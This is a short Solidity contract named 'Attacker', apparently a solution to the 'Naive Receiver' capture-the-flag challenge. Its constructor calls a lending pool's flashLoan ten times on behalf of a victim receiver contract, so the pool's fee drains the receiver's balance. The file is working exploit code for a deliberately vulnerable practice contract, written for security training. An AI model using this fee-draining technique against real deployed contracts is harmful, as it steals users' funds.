// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../src/naive-receiver/FlashLoanReceiver.sol";
import "../../src/naive-receiver/NaiveReceiverLenderPool.sol";
import "openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";


contract Attacker {
    constructor(address payable _pool, address payable _receiver){
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);
        for(uint256 i=0; i<10; i++){
            pool.flashLoan(IERC3156FlashBorrower(_receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, "0x");
        }
    }
}